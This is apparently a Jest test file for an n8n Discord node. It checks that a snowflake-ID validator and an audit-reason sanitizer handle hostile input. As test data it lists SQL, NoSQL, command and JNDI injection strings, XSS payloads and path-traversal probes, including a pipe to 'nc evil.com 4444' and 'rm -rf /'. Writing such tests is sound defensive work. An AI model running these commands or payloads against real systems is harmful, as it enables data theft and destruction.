/**
 * Priority 2: Input Sanitization & Validation Edge Cases
 *
 * Comprehensive testing of input validation and sanitization with focus on:
 * - Edge cases and boundary conditions
 * - Injection attack prevention
 * - Unicode and encoding security
 * - Performance with malicious inputs
 *
 * Target: 50%+ coverage for validation edge cases
 */

import type { IExecuteFunctions } from 'n8n-workflow'
import { NodeOperationError } from 'n8n-workflow'
import {
  validateDiscordSnowflake,
  validateAuditLogReason,
} from '../../../src/nodes/Discord/shared/validation/discord-validation'
import { isValidSnowflake } from '../../../src/nodes/Discord/v2/helpers/utils'

// Mock IExecuteFunctions
const mockExecuteFunctions = {
  getNode: jest.fn(() => ({
    id: 'test-node',
    name: 'Discord Input Validation Test',
    type: 'n8n-nodes-discord.discord',
    typeVersion: 1,
    position: [0, 0] as [number, number],
    parameters: {},
  })),
} as unknown as IExecuteFunctions

describe('Input Sanitization & Validation Edge Cases - Priority 2', () => {
  describe('Unicode & Encoding Security', () => {
    test('should handle various Unicode snowflake inputs', () => {
      const unicodeInputs = [
        '１２３４５６７８９０１２３４５６７８', // Full-width digits
        '123456789012345678', // Regular ASCII
        '𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖', // Mathematical bold digits
        '①②③④⑤⑥⑦⑧⑨⓪①②③④⑤⑥⑦⑧', // Circled numbers
      ]

      unicodeInputs.forEach((input) => {
        // Most Unicode digit representations should be rejected (only ASCII 0-9 valid)
        if (input === '123456789012345678') {
          expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, input, 'user')).not.toThrow()
        } else {
          expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, input, 'user')).toThrow(NodeOperationError)
        }
      })
    })

    test('should handle URL encoding in inputs', () => {
      const encodedInputs = [
        '%31%32%33%34%35%36%37%38%39%30%31%32%33%34%35%36%37%38', // URL encoded digits
        '123456789012345678%00', // Null byte injection
        '123456789012345678%0A', // Newline injection
        '123456789012345678%0D', // Carriage return injection
        '123456789012345678%09', // Tab injection
      ]

      encodedInputs.forEach((input) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, input, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should handle HTML/XML encoding', () => {
      const htmlEncodedInputs = [
        '&#49;&#50;&#51;&#52;&#53;&#54;&#55;&#56;&#57;&#48;&#49;&#50;&#51;&#52;&#53;&#54;&#55;&#56;', // HTML entities
        '&amp;123456789012345678', // Ampersand encoding
        '123456789012345678&lt;', // Less than encoding
        '123456789012345678&gt;', // Greater than encoding
        '123456789012345678&quot;', // Quote encoding
      ]

      htmlEncodedInputs.forEach((input) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, input, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should handle multi-byte Unicode characters', () => {
      const multiByteInputs = [
        '🔢123456789012345678', // Emoji prefix
        '123456789012345678🔢', // Emoji suffix
        '１２３🔢４５６７８９０１２３４５６７８', // Mixed Unicode
        'اَلْعَرَبِيَّةُ123456789012345678', // Arabic text
        '中文123456789012345678', // Chinese characters
        '日本語123456789012345678', // Japanese characters
      ]

      multiByteInputs.forEach((input) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, input, 'user')).toThrow(NodeOperationError)
      })
    })
  })

  describe('Injection Attack Prevention', () => {
    test('should prevent SQL injection attempts', () => {
      const sqlInjections = [
        "'; DROP TABLE snowflakes; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('admin', 'password'); --",
        "' UNION SELECT * FROM sensitive_data --",
        "'; DELETE FROM users WHERE username='admin'; --",
        "123456789012345678'; DROP TABLE users; --",
      ]

      sqlInjections.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should prevent NoSQL injection attempts', () => {
      const noSqlInjections = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '[{"$gt": ""}, {"$lt": ""}]',
        '123456789012345678{"$gt": ""}',
      ]

      noSqlInjections.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should prevent command injection attempts', () => {
      const commandInjections = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '123456789012345678; cat /etc/passwd',
        '123456789012345678 | nc evil.com 4444',
      ]

      commandInjections.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should prevent LDAP injection attempts', () => {
      const ldapInjections = [
        // eslint-disable-next-line no-template-curly-in-string
        '${jndi:ldap://evil.com}',
        // eslint-disable-next-line no-template-curly-in-string
        '${jndi:rmi://evil.com}',
        // eslint-disable-next-line no-template-curly-in-string
        '${jndi:dns://evil.com}',
        // eslint-disable-next-line no-template-curly-in-string
        '123456789012345678${jndi:ldap://evil.com}',
        '*)(uid=*',
        '*)(|(uid=*',
      ]

      ldapInjections.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should prevent XSS attempts', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        // eslint-disable-next-line no-script-url
        'javascript:alert("xss")',
        '"><script>alert("xss")</script>',
        "'; alert('xss'); //",
        '123456789012345678<script>alert("xss")</script>',
      ]

      xssAttempts.forEach((xss) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, xss, 'user')).toThrow(NodeOperationError)
      })
    })
  })

  describe('Path Traversal & File System Security', () => {
    test('should prevent path traversal attempts', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '123456789012345678/../../../etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
      ]

      pathTraversals.forEach((path) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, path, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should prevent file URI attempts', () => {
      const fileUris = [
        'file:///etc/passwd',
        'file://localhost/etc/passwd',
        'file:///c:/windows/system32/drivers/etc/hosts',
        'file:///dev/null',
        'file:///proc/self/environ',
      ]

      fileUris.forEach((uri) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, uri, 'user')).toThrow(NodeOperationError)
      })
    })
  })

  describe('Buffer Overflow & DoS Prevention', () => {
    test('should handle extremely long inputs efficiently', () => {
      const longInputs = ['a'.repeat(10000), '1'.repeat(1000000), '0'.repeat(100000), ' '.repeat(50000)]

      longInputs.forEach((longInput) => {
        const startTime = Date.now()

        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, longInput, 'user')).toThrow(NodeOperationError)

        const endTime = Date.now()
        expect(endTime - startTime).toBeLessThan(150) // Should fail quickly (adjusted for CI environments)
      })
    })

    test('should handle deeply nested JSON-like strings', () => {
      // eslint-disable-next-line prefer-template
      const deeplyNested = '{"a":'.repeat(10000) + '1' + '}'.repeat(10000)

      const startTime = Date.now()
      expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, deeplyNested, 'user')).toThrow(
        NodeOperationError,
      )
      const endTime = Date.now()

      expect(endTime - startTime).toBeLessThan(100) // Should fail quickly without parsing
    })

    test('should handle repetitive patterns efficiently', () => {
      const patterns = ['123'.repeat(10000), 'abc'.repeat(10000), '/*!*/'.repeat(5000), '<script>'.repeat(2000)]

      patterns.forEach((pattern) => {
        const startTime = Date.now()

        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, pattern, 'user')).toThrow(NodeOperationError)

        const endTime = Date.now()
        expect(endTime - startTime).toBeLessThan(50) // Should be very fast
      })
    })
  })

  describe('Null Byte & Control Character Injection', () => {
    test('should prevent null byte injection', () => {
      const nullByteInjections = [
        '123456789012345678\x00',
        '\x00123456789012345678',
        '1234567890\x0012345678',
        '123456789012345678%00',
        '123456789012345678\u0000',
      ]

      nullByteInjections.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should prevent control character injection', () => {
      const controlChars = [
        '123456789012345678\x01', // SOH
        '123456789012345678\x02', // STX
        '123456789012345678\x03', // ETX
        '123456789012345678\x1F', // Unit separator
        '123456789012345678\x7F', // DEL
        '123456789012345678\x08', // Backspace
      ]

      controlChars.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should handle newline and carriage return injection', () => {
      const newlineInjections = [
        '123456789012345678\n',
        '123456789012345678\r',
        '123456789012345678\r\n',
        '123456789012345678\n\r',
        '1234567890\n12345678',
      ]

      newlineInjections.forEach((injection) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, injection, 'user')).toThrow(NodeOperationError)
      })
    })
  })

  describe('Audit Log Reason Sanitization', () => {
    test('should sanitize various text inputs', () => {
      const testInputs = [
        '  Valid reason with spaces  ',
        '\tReason with tabs\t',
        '\nReason with newlines\n',
        'Reason with\r\nCRLF',
        'Valid reason', // Normal case
      ]

      testInputs.forEach((input) => {
        const result = validateAuditLogReason.call(mockExecuteFunctions, input)
        expect(result).toBeDefined()
        expect(result?.trim()).toBe(result) // Should be trimmed
        expect(result?.length).toBeGreaterThan(0)
      })
    })

    test('should handle potential script injection in audit reasons', () => {
      const scriptInjections = [
        '<script>alert("xss")</script>User banned',
        'User banned<!-- malicious comment -->',
        'User banned <img src="x" onerror="alert(1)">',
        // eslint-disable-next-line no-script-url
        'javascript:alert("xss") User banned',
        // eslint-disable-next-line no-useless-escape
        'User banned\"; DROP TABLE audit_logs; --',
      ]

      // These should be accepted as text (Discord handles HTML escaping)
      // but should be properly validated for length
      scriptInjections.forEach((injection) => {
        if (injection.length <= 512) {
          expect(() => validateAuditLogReason.call(mockExecuteFunctions, injection)).not.toThrow()
        } else {
          expect(() => validateAuditLogReason.call(mockExecuteFunctions, injection)).toThrow(NodeOperationError)
        }
      })
    })

    test('should handle Unicode in audit reasons', () => {
      const unicodeReasons = [
        'User banned for spam 🚫',
        'Violated rule #1: 禁止垃圾邮件',
        'Санкции за нарушение правил',
        'المستخدم محظور للرسائل غير المرغوب فيها',
        'ユーザーはスパムのため禁止されています',
      ]

      unicodeReasons.forEach((reason) => {
        const result = validateAuditLogReason.call(mockExecuteFunctions, reason)
        expect(result).toBe(reason.trim())
      })
    })

    test('should enforce character limits on audit reasons', () => {
      const maxReason = 'a'.repeat(512)
      const tooLongReason = 'a'.repeat(513)

      expect(() => validateAuditLogReason.call(mockExecuteFunctions, maxReason)).not.toThrow()

      expect(() => validateAuditLogReason.call(mockExecuteFunctions, tooLongReason)).toThrow(NodeOperationError)
    })
  })

  describe('Utility Function Edge Cases', () => {
    test('should handle isValidSnowflake edge cases', () => {
      const edgeCases = [
        { input: '', expected: false },
        { input: '0', expected: false }, // Too short
        { input: '12345678901234567', expected: true }, // Minimum valid length
        { input: '1234567890123456789', expected: true }, // Maximum valid length
        { input: '12345678901234567890', expected: false }, // Too long
        { input: '123456789012345abc', expected: false }, // Contains letters
        { input: '123 456 789 012 345', expected: false }, // Contains spaces
        { input: '123-456-789-012-345', expected: false }, // Contains dashes
        { input: '123.456.789.012.345', expected: false }, // Contains dots
        { input: '+123456789012345678', expected: false }, // Positive sign
        { input: '-123456789012345678', expected: false }, // Negative sign
      ]

      edgeCases.forEach(({ input, expected }) => {
        expect(isValidSnowflake(input)).toBe(expected)
      })
    })

    test('should handle numeric edge cases in snowflakes', () => {
      const numericEdgeCases = [
        '00000000000000000', // All zeros (17 digits)
        '000000000000000000', // All zeros (18 digits)
        '0000000000000000000', // All zeros (19 digits)
        '99999999999999999', // All nines (17 digits)
        '999999999999999999', // All nines (18 digits)
        '9999999999999999999', // All nines (19 digits)
        '12345678901234567890', // One digit too long
        '1234567890123456', // One digit too short
      ]

      const validLengths = [17, 18, 19]
      numericEdgeCases.forEach((snowflake) => {
        const isValid = validLengths.includes(snowflake.length) && /^\d+$/.test(snowflake)
        expect(isValidSnowflake(snowflake)).toBe(isValid)
      })
    })
  })

  describe('Performance Under Attack Conditions', () => {
    test('should handle malicious input patterns efficiently', () => {
      const maliciousPatterns = [
        // ReDoS attempt patterns
        // eslint-disable-next-line prefer-template
        'a'.repeat(1000) + 'X',
        // eslint-disable-next-line prefer-template
        '1'.repeat(1000) + 'a',
        'a*'.repeat(500),
        '(a|a)*'.repeat(100),
        // Stack overflow attempts
        '('.repeat(1000) + ')'.repeat(1000),
        '{'.repeat(1000) + '}'.repeat(1000),
      ]

      maliciousPatterns.forEach((pattern) => {
        const startTime = Date.now()

        // Should reject quickly without expensive operations
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, pattern, 'user')).toThrow(NodeOperationError)

        const endTime = Date.now()
        expect(endTime - startTime).toBeLessThan(50) // Should be very fast
      })
    })

    test('should handle concurrent malicious requests', async () => {
      const maliciousInput = '<script>alert("xss")</script>'.repeat(100)
      const concurrentAttacks = 100

      const startTime = Date.now()

      const promises = Array(concurrentAttacks)
        .fill(0)
        .map(() =>
          Promise.resolve().then(() => {
            try {
              validateDiscordSnowflake.call(mockExecuteFunctions, maliciousInput, 'user')
            } catch {
              // Expected to throw
            }
          }),
        )

      await Promise.all(promises)

      const endTime = Date.now()
      expect(endTime - startTime).toBeLessThan(1000) // Should handle efficiently
    })
  })

  describe('Edge Case Combinations', () => {
    test('should handle combinations of attack vectors', () => {
      const combinedAttacks = [
        "'; DROP TABLE users; --<script>alert('xss')</script>",
        // eslint-disable-next-line no-template-curly-in-string
        '../../../etc/passwd${jndi:ldap://evil.com}',
        '%2e%2e%2f<img src="x" onerror="alert(1)">',
        // eslint-disable-next-line no-script-url
        'javascript:alert("xss")<!-- comment -->',
        // eslint-disable-next-line no-template-curly-in-string
        '${jndi:ldap://evil.com}"; DROP TABLE users; --',
      ]

      combinedAttacks.forEach((attack) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, attack, 'user')).toThrow(NodeOperationError)
      })
    })

    test('should handle edge cases with valid prefixes/suffixes', () => {
      const edgeCases = [
        '123456789012345678\0extra', // Valid start, null byte
        '123456789012345678<script>', // Valid start, XSS suffix
        'valid123456789012345678', // Invalid prefix, valid end
        '123456789012345678/../etc', // Valid start, path traversal
      ]

      edgeCases.forEach((edgeCase) => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, edgeCase, 'user')).toThrow(NodeOperationError)
      })
    })
  })
})
